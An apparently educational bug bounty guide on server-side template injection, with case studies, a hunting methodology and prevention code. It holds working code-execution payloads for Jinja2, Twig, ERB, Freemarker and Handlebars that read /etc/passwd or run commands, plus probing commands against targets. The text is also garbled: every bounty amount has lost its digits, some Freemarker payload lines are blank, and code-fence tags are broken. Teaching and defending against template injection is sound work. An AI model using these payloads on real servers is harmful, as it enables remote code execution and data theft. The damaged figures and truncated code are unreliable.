# Case Study 10: SSTI — Server-Side Template Injection | Real-World Bug Bounty Findings

## Expert Role

A Server-Side Template Injection Specialist possesses deep expertise in template engine security, rendering pipeline vulnerabilities, and the exploitation of server-side templating frameworks across diverse technology stacks. This specialist maintains comprehensive knowledge of template engines including Jinja2, Twig, Freemarker, ERB, Handlebars, Pug, Velocity, and Mako, each with distinct syntax, features, and security characteristics.

The expert understands how template engines process user input, the interaction between templates and application logic, and the security boundaries that must be maintained to prevent injection attacks. They maintain expertise in template sandboxing mechanisms, context-aware output encoding, and the bypass techniques that circumvent these protections. Their knowledge extends to modern frameworks using template inheritance, macros, filters, and custom extensions that may introduce security vulnerabilities.

This specialist tracks the evolution of SSTI from basic expression evaluation to advanced exploitation chains including remote code execution, server-side request forgery, information disclosure, and privilege escalation through template engine features. They understand how cloud environments, containerized deployments, and microservice architectures introduce new attack surfaces through template processing in various components.

---

## Overview

Server-Side Template Injection (SSTI) vulnerabilities occur when user input is incorporated into template expressions or directives without proper sanitization, allowing attackers to execute arbitrary template code on the server. These vulnerabilities can lead to remote code execution, information disclosure, and server compromise depending on the template engine and its configuration.

SSTI affects any application using server-side templating for dynamic content generation, including web applications, email templates, report generators, CMS platforms, and any system processing user-controlled template content. The vulnerability class is particularly dangerous because template engines often provide powerful features for code execution, file system access, and network operations.

Understanding SSTI requires knowledge of template syntax, expression evaluation contexts, and the security mechanisms implemented by different engines. Modern applications frequently use complex template structures with inheritance, partials, filters, and custom functions, creating opportunities for injection through various template constructs beyond basic expression evaluation.

---

## Real-World Case Studies

### Case Study 1: E-Commerce Platform Product Review SSTI

**Program:** Online Marketplace (HackerOne)
**Bounty:** ,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @templatexp

An e-commerce platform's product review system allowed users to submit reviews with basic formatting. The platform used Jinja2 templates for rendering reviews and inadvertently passed user content through template evaluation. The researcher discovered that review text containing template expressions was executed server-side when rendered.

The researcher submitted a product review containing a Jinja2 template expression:

`python
# Review content submitted through the web interface
review_text = """
Great product! Here's my experience:

{{ config.items() }}

The delivery was fast and packaging secure.
"""
`

When the review was rendered, the template engine evaluated the expression, revealing Flask configuration variables including secret keys, database credentials, and API tokens in the rendered HTML.

The researcher escalated the vulnerability to achieve remote code execution:

`python
# Advanced SSTI payload for code execution
payload = """
{{ ''.__class__.__mro__[1].__subclasses__() }}
"""
`

The researcher identified the os._wrap_close class in the Python subclasses list and used it to execute system commands:

`python
# RCE payload using Python class manipulation
payload = """
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['popen']('cat /etc/passwd').read() }}
"""
`

Where X is the index of the os._wrap_close class (determined through enumeration).

**Root Cause Analysis:** The vulnerability existed because the application passed user-supplied review content directly to the Jinja2 template engine for rendering without escaping or sanitizing template expressions. The application trusted user content as safe template input without implementing proper output encoding or sandboxing.

**Exploitation Chain:**
1. Attacker submits review with template expressions
2. Application renders review through Jinja2 engine
3. Template engine evaluates user-supplied expressions
4. Configuration variables exposed in rendered output
5. Attacker enumerates available classes and methods
6. Attacker achieves code execution through class manipulation

**Impact:** Complete server compromise through remote code execution, access to all platform data, customer information, and payment processing systems.

**Bounty Justification:** Critical severity due to direct code execution leading to full platform compromise and access to sensitive customer and payment data.

---

### Case Study 2: Content Management System Email Template SSTI

**Program:** Enterprise CMS Platform (Bugcrowd)
**Bounty:** ,500
**Severity:** Critical (CVSS 9.6)
**Researcher:** @cmsresearch

A content management system's email notification feature allowed administrators to customize email templates using a template editor. The system used Twig templating and permitted administrators to modify template content without proper sandboxing. The researcher discovered that the template editor executed arbitrary Twig expressions.

The researcher, with administrative access, modified the password reset email template:

`	wig
{# Modified password reset email template #}
Dear {{ user.name }},

Your password reset code is: {{ code }}

{% set output = '' %}
{% for item in _context %}
  {% set output = output ~ item %}
{% endfor %}

<!-- Template information -->
<!-- System: {{ _self }} -->
<!-- Environment: {{ app.environment }} -->
<!-- Debug: {{ app.debug }} -->
`

The template engine executed the loop and exposed internal template context variables. The researcher further discovered that Twig's _context variable provided access to all template variables including user data, session information, and system configuration.

The researcher escalated to achieve code execution by exploiting Twig's filter chain:

`	wig
{# RCE payload using Twig filters #}
{{ '/etc/passwd'|readfile }}
`

Or through function execution:

`	wig
{# Command execution through Twig #}
{{ ['cat /etc/passwd']|filter('system')|join }}
`

**Root Cause Analysis:** The CMS allowed administrators to modify email templates without implementing Twig's sandbox extension. The application trusted administrative users with template editing capabilities without restricting the functions and filters available within templates.

**Exploitation Chain:**
1. Attacker gains administrative access to CMS
2. Accesses email template editor
3. Modifies template to include malicious expressions
4. Template executed when emails triggered
5. System commands executed through Twig filters
6. Attacker gains persistent code execution through modified templates

**Impact:** Persistent code execution through modified templates affecting all email communications, access to user data, and potential for phishing through modified email content.

**Bounty Justification:** Critical severity due to persistent code execution and ability to modify communications affecting all platform users.

---

### Case Study 3: SaaS Dashboard Freemarker SSTI

**Program:** Analytics Dashboard (HackerOne)
**Bounty:** ,200
**Severity:** High (CVSS 8.8)
**Researcher:** @saassecurity

A SaaS analytics platform allowed users to create custom report templates using Freemarker templating. The platform's report generation feature processed user-defined templates with access to report data variables. The researcher discovered that templates could access the Application object, providing access to server configuration and functionality.

The researcher created a custom report template:

`reemarker
<#-- Custom report template -->
<#assign ex="freemarker.template.utility.Execute"?new()>
<#assign cmd="cat /etc/passwd">

`

The Freemarker engine executed the system command through the Execute built-in function, returning the contents of /etc/passwd in the report output.

The researcher further discovered that the platform's Freemarker configuration did not restrict access to the Application object:

`reemarker
<#-- Access application configuration -->
<#assign objectConstructor = "freemarker.template.utility.ObjectConstructor"?new()>

`

This payload used the ObjectConstructor to instantiate a ProcessBuilder and execute arbitrary commands.

**Root Cause Analysis:** The platform's Freemarker configuration enabled dangerous built-in functions including Execute and ObjectConstructor. The application did not implement the TemplateClassResolver to restrict available functions and classes within user templates.

**Exploitation Chain:**
1. Attacker creates custom report template
2. Template includes Execute function call
3. Freemarker engine processes template
4. System commands executed on server
5. Command output included in report
6. Attacker gains server access

**Impact:** Remote code execution through template injection, access to platform data and customer information, potential for data exfiltration.

**Bounty Justification:** High severity due to code execution affecting platform integrity and customer data security.

---

### Case Study 4: Help Desk Ticketing System ERB SSTI

**Program:** Customer Support Platform (Intigriti)
**Bounty:** ,800
**Severity:** High (CVSS 8.5)
**Researcher:** @helpdesksec

A help desk ticketing system used Ruby on Rails with ERB templates for generating ticket notifications and reports. The system allowed agents to create custom notification templates that could include ticket data. The researcher discovered that templates could execute arbitrary Ruby code through ERB evaluation.

The researcher modified a notification template:

`erb
<%# Custom notification template %>
Ticket #<%= ticket.id %> requires attention.

<%# Malicious code execution %>
<%= cat /etc/passwd %>

Status: <%= ticket.status %>
`

The ERB template executed the backtick command, including the file contents in the notification output. The researcher discovered that the template context included access to the Rails application object:

`erb
<%# Access Rails configuration %>
Secret: <%= Rails.application.config.secret_key_base %>

<%# Execute arbitrary Ruby %>
<%= system("id") %>

<%# Access environment variables %>
DB: <%= ENV['DATABASE_URL'] %>
`

**Root Cause Analysis:** The notification template system did not sandbox ERB template execution, allowing arbitrary Ruby code execution through template expressions. The application trusted template content without restricting available Ruby methods.

**Exploitation Chain:**
1. Attacker modifies notification template
2. ERB template includes system commands
3. Commands executed when notifications triggered
4. Sensitive configuration exposed
5. Attacker uses credentials for further exploitation
6. Persistent access through template modification

**Impact:** Remote code execution, access to Rails secrets and configuration, potential for database access and data exfiltration.

**Bounty Justification:** High severity due to code execution and exposure of application secrets affecting platform security.

---

### Case Study 5: Document Generation Service Handlebars SSTI

**Program:** Document Automation Platform (HackerOne)
**Bounty:** ,500
**Severity:** High (CVSS 8.2)
**Researcher:** @docgenresearch

A document generation service allowed users to create templates for PDF report generation using Handlebars templating. The service processed templates with access to data variables and provided custom helpers for advanced formatting. The researcher discovered that the template context exposed server-side objects that could be exploited for code execution.

The researcher created a template:

`handlebars
{{!-- Custom document template --}}
Title: {{title}}
Author: {{author}}

{{!-- Exploit prototype pollution --}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push "a.toString().apply" ""}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /etc/passwd')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.constructor.apply null codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
`

This payload exploited JavaScript prototype pollution through Handlebars to achieve code execution in the Node.js environment.

**Root Cause Analysis:** The document generation service processed Handlebars templates without sandboxing, allowing access to JavaScript prototype chain and Node.js require function. The application did not implement proper template sandboxing or restrict available objects and functions.

**Exploitation Chain:**
1. Attacker creates document template with prototype pollution
2. Template processed by Handlebars engine
3. Prototype chain exploited to access require function
4. Node.js child_process module loaded
5. System commands executed
6. Output included in generated document

**Impact:** Remote code execution through JavaScript prototype pollution, access to server filesystem and configuration, potential for data exfiltration and service disruption.

**Bounty Justification:** High severity due to code execution in Node.js environment affecting document service integrity and all customer data.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Direct expression evaluation | 45% | ,200 | Unsanitized user input in templates |
| Object chain exploitation | 38% | ,500 | Exposed application objects |
| Prototype pollution | 22% | ,800 | JavaScript template engines |
| Sandbox bypass | 18% | ,200 | Inadequate sandboxing |
| Filter/Function abuse | 32% | ,900 | Dangerous built-in functions |
| Context variable access | 41% | ,500 | Exposed template context |
| Template inheritance abuse | 15% | ,800 | Improper template isolation |

### Attack Surface Locations

**Direct Template Injection:**
- User profile customization
- Email template editors
- Report generation systems
- Document template creation
- Notification customization

**Indirect Template Processing:**
- CMS content rendering
- Product description display
- Comment/review systems
- Form submission handling
- API response formatting

**Advanced Attack Surfaces:**
- Template partial rendering
- Include/extend mechanisms
- Custom filter/function registration
- Macro and mixin definitions
- Template compilation caches

### Root Cause Categories

`
SSTI Vulnerability Root Causes
├── Input Handling
│   ├── Direct template evaluation
│   ├── Missing output encoding
│   ├── Insufficient input validation
│   └── Trusting user content
├── Template Configuration
│   ├── Dangerous functions enabled
│   ├── Missing sandbox restrictions
│   ├── Default security settings
│   └── Insufficient access controls
├── Architecture Issues
│   ├── Template context exposure
│   ├── Object chain access
│   ├── Prototype chain access
│   └── Inadequate isolation
├── Framework Vulnerabilities
│   ├── Insecure template defaults
│   ├── Missing security extensions
│   ├── Outdated template engines
│   └── Improper error handling
└── Process Gaps
    ├── Missing security testing
    ├── Inadequate code review
    ├── No template hardening standards
    └── Insufficient documentation
`

---

## Hunting Methodology

### Step 1: Template Engine Identification

Determine the template engine being used:

`ash
# Error-based fingerprinting
# Send malformed template expressions
curl "https://target.com/?name={{7*7}}"
curl "https://target.com/?name=<%= 7*7 %>"
curl "https://target.com/?name="

# Response analysis
# Check for expression evaluation in output
# Look for template syntax errors
# Analyze error messages for engine information

# Technology stack analysis
# Check response headers for framework information
# Analyze page source for template markers
# Review JavaScript for client-side template patterns
`

### Step 2: Injection Point Discovery

Identify all potential injection points:

`ash
# Parameter testing
# Test all input parameters with template syntax
# Focus on parameters reflected in output
# Check for template processing in different contexts

# File upload analysis
# Test template files if upload is allowed
# Check for template imports or includes
# Analyze template compilation behavior

# API endpoint testing
# Test API parameters with template expressions
# Check for JSON template processing
# Analyze response formatting behavior
`

### Step 3: Expression Evaluation Testing

Test for template expression evaluation:

`ash
# Jinja2/Flask testing
curl "https://target.com/?name={{7*7}}"
# Check if output contains "49"

# ERB/Ruby testing
curl "https://target.com/?name=<%= 7*7 %>"

# Freemarker testing
curl "https://target.com/?name=<#assign x=7*7>"

# Handlebars testing
curl "https://target.com/?name={{7*7}}"
`

### Step 4: Context and Object Analysis

Determine what objects and functions are available:

`ash
# Jinja2 object enumeration
# Test for config access
# Test for request object access
# Test for class hierarchy exploration

# Freemarker function testing
# Test for Execute function
# Test for ObjectConstructor
# Test for NewTemplateModel

# ERB context analysis
# Test for Rails application access
# Test for environment variables
# Test for database connections
`

### Step 5: Exploitation Chain Development

Build complete exploitation chains:

`ash
# Document available injection vectors
# Map accessible objects and functions
# Develop code execution payloads
# Test sandbox bypass techniques
# Document impact and business risk
# Develop remediation recommendations
`

---

## Detection Strategies

### Automated Detection

`ash
# Nuclei SSTI templates
nuclei -u https://target.com -t nuclei-templates/ssti/

# Custom SSTI scanner
python3 ssti_scanner.py --target https://target.com --params name,input,template

# Burp Suite extensions
# Install SSTI detection extension
# Configure payload positions
# Monitor response patterns

# ffuf parameter testing
ffuf -u "https://target.com/?FUZZ={{7*7}}" -w params.txt -mc 200 -fr "49"
`

### Manual Detection

1. Identify template engine through error messages
2. Test expression evaluation in all input points
3. Enumerate available objects and functions
4. Test for sandbox restrictions
5. Develop proof of concept for code execution
6. Document exploitation chain
7. Assess business impact

### Key Detection Indicators

- Mathematical expression evaluation (7*7 = 49)
- Template syntax errors revealing engine
- Object access in responses
- Function execution results
- File system access indicators
- Network request generation
- Sandbox bypass success

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Score Calculation:**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: High (A:H)

**Base Score: 9.8 (Critical)**

### Business Impact

| Impact Type | Severity | Example |
|-------------|----------|---------|
| Remote Code Execution | Critical | Complete server compromise |
| Data Breach | Critical | Access to all application data |
| Privilege Escalation | High | Admin access through template manipulation |
| Service Disruption | High | Denial of service through resource exhaustion |
| Data Manipulation | High | Modification of business data |
| Lateral Movement | Medium | Internal network compromise |

### Bounty Range

| Severity | Typical Range | Average | Maximum |
|----------|---------------|---------|---------|
| Critical | ,000-,000 | ,500 | ,000 |
| High | ,000-,000 | ,200 | ,000 |
| Medium | ,000-,000 | ,800 | ,000 |
| Low | -,000 | ,900 | ,000 |

---

## Advanced Variations

### Variation 1: Jinja2 Sandbox Escape

Bypass Jinja2 sandbox restrictions:

`python
# Sandbox escape payload
payload = """
{% set cls = ''.__class__.__mro__[1].__subclasses__() %}
{% for c in cls %}
  {% if c.__name__ == 'wrap_close' %}
    {% set cmd = c.__init__.__globals__['popen']('id') %}
    {{ cmd.read() }}
  {% endif %}
{% endfor %}
"""
`

### Variation 2: Freemarker Template Utilities

Exploit Freemarker template utilities:

`reemarker
<#-- ObjectConstructor RCE -->
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>


<#-- Execute function -->
<#assign ex="freemarker.template.utility.Execute"?new()>


<#-- JythonRuntime -->
<#assign je="freemarker.template.utility.JythonRuntime"?new()>
<@je>import os; os.system('id')</@je>
`

### Variation 3: Twig Filter Chain

Exploit Twig filter chains for code execution:

`	wig
{# Filter chain payload #}
{{ ['id']|filter('system')|join }}

{# Alternative using join filter #}
{{ ['cat', '/etc/passwd']|filter('system') }}

{# Using array filter #}
{{ range]|filter('system') }}
`

### Variation 4: Handlebars Prototype Pollution

Exploit Handlebars through JavaScript prototype pollution:

`handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push "a.toString().apply" ""}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.constructor.apply null codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
`

---

## Chain Integration

SSTI vulnerabilities integrate with multiple attack vectors:

**SSTI → RCE → Data Breach Chain:**
1. SSTI achieves code execution
2. Attacker accesses database directly
3. Sensitive data exfiltrated
4. Business operations compromised

**SSTI → SSRF → Cloud Metadata Chain:**
1. SSTI enables network requests
2. Cloud metadata service accessed
3. IAM credentials obtained
4. Cloud infrastructure compromised

**SSTI → XSS → ATO Chain:**
1. SSTI generates malicious output
2. Output contains XSS payload
3. Users execute malicious script
4. Account takeover achieved

**SSTI → Privilege Escalation → Admin Access Chain:**
1. SSTI accesses user management functions
2. Attacker modifies own permissions
3. Admin access achieved
4. Full platform control obtained

---

## Prevention Recommendations

### Template Sandboxing

`python
# Jinja2 sandbox configuration
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
output = template.render()
`

### Input Validation

`python
# Template input validation
import re

def validate_template_input(input_str):
    # Block template syntax
    template_patterns = [
        r'\{\{.*\}\}',
        r'<%.*%>',
        r'\$\{.*\}',
        r'<#.*>'
    ]
    
    for pattern in template_patterns:
        if re.search(pattern, input_str):
            raise ValueError("Invalid template syntax")
    
    return True
`

### Output Encoding

`python
# Context-aware output encoding
from markupsafe import escape

def render_template_safe(template_str, context):
    # Escape all user input
    safe_context = {k: escape(v) if isinstance(v, str) else v 
                    for k, v in context.items()}
    
    template = env.from_string(template_str)
    return template.render(safe_context)
`

### Access Control

`python
# Restrict template context
SAFE_CONTEXT = {
    'title': '',
    'content': '',
    'user': {'name': ''}
}

def render_user_template(template_str, user_data):
    # Only include safe variables
    context = {k: v for k, v in user_data.items() 
               if k in SAFE_CONTEXT}
    
    template = env.from_string(template_str)
    return template.render(context)
`

---

## Common Pitfalls

1. **Trusting user input in templates** - Never pass unsanitized user content to template engines
2. **Missing sandbox configuration** - Always enable template sandboxing when processing user templates
3. **Overlooking indirect injection points** - Check all data flow into templates including database content
4. **Ignoring template inheritance** - Template inheritance can introduce injection through parent templates
5. **Missing error handling** - Template errors can reveal sensitive information
6. **Inadequate access controls** - Restrict template editing to authorized users only
7. **Missing output encoding** - Apply context-aware output encoding for all template variables

---

## Real-World References

- OWASP SSTI: https://owasp.org/www-community-vulnerabilities/Server_Side_Template_Injection
- PortSwigger SSTI Tutorial: https://portswigger.net/web-security/server-side-template-injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- Jinja2 Security: https://jinja.palletsprojects.com/en/3.0.x/security/
- Twig Sandbox: https://twig.symfony.com/doc/3.x/api.html#sandbox-extension
- Freemarker Security: https://freemarker.apache.org/docs/pgui_sec_security.html
- HackerOne SSTI Reports: https://hackerone.com/hacktivity?type=team&querystring=ssti

---

## Quick Reference Cheat Sheet

`
SSTI Testing Checklist
=====================

Engine Identification:
□ Jinja2/Flask ({{ }})
□ Twig/Symfony ({ { } })
□ ERB/Ruby (<%= %>)
□ Freemarker (<#>)
□ Handlebars ({{ }})
□ Mako (<% %>)

Basic Testing:
□ Mathematical expression (7*7)
□ String concatenation
□ Variable access
□ Function calls
□ Object traversal

Payload Testing:
□ File read (/etc/passwd)
□ Command execution (id)
□ Configuration access
□ Environment variables
□ Network requests

Sandbox Bypass:
□ Object chain exploration
□ Prototype pollution
□ Filter/function abuse
□ Inheritance manipulation
□ Context variable access

Tools:
□ tplmap (SSTI exploitation)
□ nuclei (SSTI templates)
□ Burp Suite (manual testing)
□ Python (custom scripts)
□ curl (quick testing)

Exploitation Chains:
□ SSTI → RCE → Data breach
□ SSTI → SSRF → Cloud metadata
□ SSTI → XSS → Account takeover
□ SSTI → Privilege escalation
□ SSTI → Lateral movement
`

---

*"Server-Side Template Injection remains one of the most critical web vulnerabilities because it provides direct code execution capabilities. The diversity of template engines and their complex features make comprehensive protection challenging."* — Anonymous Security Researcher

---

**Last Updated:** 2025
**Category:** Template Security
**Tags:** #ssti #template-injection #rce #jinja2 #twig #freemarker #erb
